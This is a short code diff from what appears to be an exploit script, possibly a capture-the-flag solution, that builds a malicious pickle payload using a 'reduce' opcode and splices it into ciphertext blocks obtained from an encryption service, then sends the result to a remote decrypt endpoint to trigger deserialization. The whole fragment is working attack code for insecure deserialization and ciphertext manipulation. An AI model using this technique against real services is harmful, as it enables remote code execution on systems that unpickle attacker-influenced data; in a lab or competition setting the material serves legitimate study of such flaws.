@@ -108,11 +108,8 @@ if __name__ == '__main__':
     inject += b'R' # stack[-2](stack[-1]) (load_reduce)
     inject += b'\x00' * ((16 - len(inject) % 16) % 16)
 
-    payload = ''
-    blocks = split_fix_length(encrypt(b'A' * length, host, port), 32)
-    payload += blocks[0] + blocks[1]
     blocks = split_fix_length(encrypt(b'A' * length + inject, host, port), 32)
-    payload += ''.join(blocks[2:2 + len(inject) // 16])
+    payload = ''.join(blocks[2:2 + len(inject) // 16])
 
     # bim!
     decrypt(payload, host, port)
